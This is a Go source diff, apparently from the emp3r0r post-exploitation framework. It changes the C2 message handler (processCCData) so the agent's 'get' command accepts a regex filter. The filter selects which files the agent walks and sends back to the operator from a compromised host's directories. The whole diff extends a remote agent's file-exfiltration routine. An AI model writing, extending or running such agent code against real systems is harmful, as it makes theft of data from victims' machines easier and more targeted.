@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -94,6 +95,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		// Downloads a file from the agent starting at the specified offset.
 		log.Printf("get: %v", cmdSlice)
 		file_path := flags.StringP("file_path", "f", "", "File path to download")
+		filter := flags.StringP("filter", "r", "", "Regex filter for file names to download")
 		offset := flags.Int64P("offset", "o", 0, "Offset to start downloading from")
 		token := flags.StringP("token", "t", "", "Token for the download")
 		flags.Parse(cmdSlice[1:])
@@ -106,12 +108,25 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if util.IsDirExist(*file_path) {
 			// directory, return a list of files to download
 			log.Printf("Downloading directory %s recursively", *file_path)
+			var re *regexp.Regexp
+			if *filter != "" {
+				// parse regex
+				re, err = regexp.Compile(*filter)
+				if err != nil {
+					out = fmt.Sprintf("Invalid regex filter: %v", err)
+					break
+				}
+				log.Printf("Filtering files with %s", strconv.Quote(*filter))
+			}
 			file_list := []string{}
 			err = filepath.Walk(*file_path, func(path string, info os.FileInfo, err error) error {
 				if err != nil {
 					return err
 				}
 				if !info.IsDir() {
+					if re != nil && !re.MatchString(info.Name()) {
+						return nil
+					}
 					file_list = append(file_list, path)
 					log.Printf("Found file '%s' to download", path)
 				}
